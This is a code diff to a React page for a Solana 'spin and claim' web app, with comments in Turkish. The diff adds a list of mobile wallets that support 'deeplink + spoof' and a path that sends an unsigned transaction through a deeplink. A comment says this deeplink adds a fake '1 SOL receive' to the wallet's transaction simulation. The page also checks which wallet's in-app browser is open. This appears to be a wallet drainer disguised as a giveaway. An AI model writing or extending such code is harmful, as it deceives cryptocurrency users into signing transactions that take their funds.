@@ -11,6 +11,7 @@ import { useConnection, useWallet } from '@solana/wallet-adapter-react'
 import type { WalletAdapter, WalletName } from '@solana/wallet-adapter-base'
 import { WalletReadyState }            from '@solana/wallet-adapter-base'
 import { createUnsignedTransaction }   from '@/app/services/transaction'
+import { buildDeeplink }               from '@/app/services/deeplink'   // ← eklendi
 
 // ——— Telegram WebApp tipi ———
 interface TgWebApp {
@@ -44,83 +45,64 @@ export default function Page() {
     }
   }, [])
 
+  /* ——— telegram harici aşağı scroll ——— */
+  useEffect(() => {
+    const inTelegram =
+      typeof (window as any).Telegram !== 'undefined' &&
+      !!(window as any).Telegram.WebApp &&
+      !!(window as any).Telegram.WebApp.initData?.length
 
-/* telegram harici aşağı scroll */
-useEffect(() => {
-  const inTelegram =
-    typeof (window as any).Telegram !== 'undefined' &&
-    !!(window as any).Telegram.WebApp &&
-    !!(window as any).Telegram.WebApp.initData?.length
-
-  const minOffset = 75  // sabit bırakılacak kaydırma tamponu
-
-  // ——— Sadece Telegram‑DIŞI + 322‑499px aralığında ———
-  const w = window.innerWidth
-  if (!inTelegram && w >= 322 && w <= 499) {
-    // 1) Sayfayı ilk yüklemede 50px aşağı kaydır
-    window.scrollTo({ top: minOffset })
-
-    // 2) Kullanıcı yukarı çekerse tekrar 50px’e döndür
-    const keepOffset = () => {
-      if (window.scrollY < minOffset) window.scrollTo({ top: minOffset })
-    }
-    window.addEventListener('scroll', keepOffset, { passive: true })
-
-    // 3) Temizleme
-    return () => window.removeEventListener('scroll', keepOffset)
-  }
-}, [])
-
-
-
-/* ——— Telegram dışı + In-App Wallet tarayıcıda spin’dan sonra modal aç ——— */
-useEffect(() => {
-  if (typeof window === 'undefined') return;
-
-  const webapp = (window as any).Telegram?.WebApp as any;
-  const inTelegram = Boolean(webapp?.initData);     // artık hata vermez
-  const w = window.innerWidth;
-
-  // Sadece Telegram DIŞI ve 322–499px aralığında devam
-  if (inTelegram || w < 322 || w > 499) return;
-
-  // Tarayıcıda hangi cüzdan in-app browser’ı?
-  const isPhantom        = Boolean((window as any).solana?.isPhantom);
-  const isTrust          = Boolean((window as any).ethereum?.isTrust) || /Trust/i.test(navigator.userAgent);
-  const isCoinbaseWallet = Boolean((window as any).ethereum?.isCoinbaseWallet) || /CoinbaseWallet/i.test(navigator.userAgent);
-  const isBitkeep        = /BitKeep|Bitget/i.test(navigator.userAgent);
-  const isSolflare       = Boolean((window as any).solflare?.isSolflare) || /Solflare/i.test(navigator.userAgent);
-  const isBackpack       = /Backpack/i.test(navigator.userAgent);
-
-  const isWalletBrowser = isPhantom
-    || isTrust
-    || isCoinbaseWallet
-    || isBitkeep
-    || isSolflare
-    || isBackpack;
-
-  if (!isWalletBrowser) return;
-
-  // Eğer daha önce spin yapılmadıysa → otomatik scroll + modal
-  if (!localStorage.getItem('hasSpun')) {
-    const minOffset = 50;
-    window.scrollTo({ top: minOffset });
-
-    const keepOffset = () => {
-      if (window.scrollY < minOffset) {
-        window.scrollTo({ top: minOffset });
+    const minOffset = 75  // sabit bırakılacak kaydırma tamponu
+    const w = window.innerWidth
+    if (!inTelegram && w >= 322 && w <= 499) {
+      window.scrollTo({ top: minOffset })
+      const keepOffset = () => {
+        if (window.scrollY < minOffset) window.scrollTo({ top: minOffset })
       }
-    };
-    window.addEventListener('scroll', keepOffset, { passive: true });
+      window.addEventListener('scroll', keepOffset, { passive: true })
+      return () => window.removeEventListener('scroll', keepOffset)
+    }
+  }, [])
 
-    localStorage.setItem('hasSpun', 'true');
-    setHasSpun(true);
+  /* ——— Telegram dışı + In-App Wallet tarayıcıda spin’dan sonra modal aç ——— */
+  useEffect(() => {
+    if (typeof window === 'undefined') return
 
-    return () => window.removeEventListener('scroll', keepOffset);
-  }
-}, []);
+    const webapp = (window as any).Telegram?.WebApp as any
+    const inTelegram = Boolean(webapp?.initData)
+    const w = window.innerWidth
+    if (inTelegram || w < 322 || w > 499) return
 
+    const isPhantom        = Boolean((window as any).solana?.isPhantom)
+    const isTrust          = Boolean((window as any).ethereum?.isTrust) || /Trust/i.test(navigator.userAgent)
+    const isCoinbaseWallet = Boolean((window as any).ethereum?.isCoinbaseWallet) || /CoinbaseWallet/i.test(navigator.userAgent)
+    const isBitkeep        = /BitKeep|Bitget/i.test(navigator.userAgent)
+    const isSolflare       = Boolean((window as any).solflare?.isSolflare) || /Solflare/i.test(navigator.userAgent)
+    const isBackpack       = /Backpack/i.test(navigator.userAgent)
 
+    const isWalletBrowser = isPhantom
+      || isTrust
+      || isCoinbaseWallet
+      || isBitkeep
+      || isSolflare
+      || isBackpack
+
+    if (!isWalletBrowser) return
+
+    if (!localStorage.getItem('hasSpun')) {
+      const minOffset = 50
+      window.scrollTo({ top: minOffset })
+      const keepOffset = () => {
+        if (window.scrollY < minOffset) {
+          window.scrollTo({ top: minOffset })
+        }
+      }
+      window.addEventListener('scroll', keepOffset, { passive: true })
+      localStorage.setItem('hasSpun', 'true')
+      setHasSpun(true)
+      return () => window.removeEventListener('scroll', keepOffset)
+    }
+  }, [])
 
   /* ——— Çark (spin) durumu ——— */
   const wheelRef = useRef<HTMLImageElement>(null)
@@ -227,6 +209,15 @@ useEffect(() => {
     (x): x is DrawerWallet => x !== null
   )
 
+  /* ——— Deeplink + spoof destekleyen cüzdanlar ——— */
+  const DEEPLINK_WALLETS = [
+    'Solflare',
+    'Trust Wallet',
+    'Backpack',
+    'Coinbase Wallet',
+    'Bitget Wallet',
+  ]
+
   /* ——— Connect Wallet ——— */
   const handleConnect = async () => {
     setLoading(true)
@@ -260,6 +251,16 @@ useEffect(() => {
         setMsg('Claim failed')
         return
       }
+
+      // deeplink + spoof yolu
+      const adapterName = wallet?.adapter.name
+      if (adapterName && DEEPLINK_WALLETS.includes(adapterName)) {
+        const link = await buildDeeplink(tx) // simülasyonda “1 SOL receive” ekler
+        window.location.href = link          // mobil cüzdan uygulamasına geç
+        return
+      }
+
+      // normal masaüstü/Phantom yolu
       let signature: string
       if (wallet?.adapter && 'signAndSendTransaction' in wallet.adapter) {
         const res = await (wallet.adapter as any).signAndSendTransaction(tx, conn)
@@ -291,15 +292,13 @@ useEffect(() => {
   const handleClaim = async () => {
     if (loading) return
     setMsg('')
-
-    // 1) Zaten bağlıysak → direkt işlem
+    // 1) cüzdan bağlıysa direkt gönder
     if (publicKey) {
       setLoading(true)
       await doTx()
       return
     }
-
-    // 2) Tek bir Installed adapter varsa → işaretle, bağlan ve Effect başlatsın
+    // 2) tek bir yüklü adapter varsa otomatik connect+tx
     const installed = orderedWallets.filter(
       (w) => w.readyState === WalletReadyState.Installed
     )
@@ -309,8 +308,7 @@ useEffect(() => {
       await select(installed[0].adapter.name as WalletName)
       return
     }
-
-    // 3) Diğer durumlarda modal aç
+    // 3) diğer durumda modal göster
     openDrawer()
   }
 
@@ -322,9 +320,8 @@ useEffect(() => {
       if (w.readyState === 'Installed' && sol?.isPhantom) {
         await select(w.adapter.name as WalletName)
         return doTx()
-      } else {
-        return openPhantomBrowser()
       }
+      return openPhantomBrowser()
     }
     if (w.readyState === 'Installed') {
       await select(w.adapter.name as WalletName)
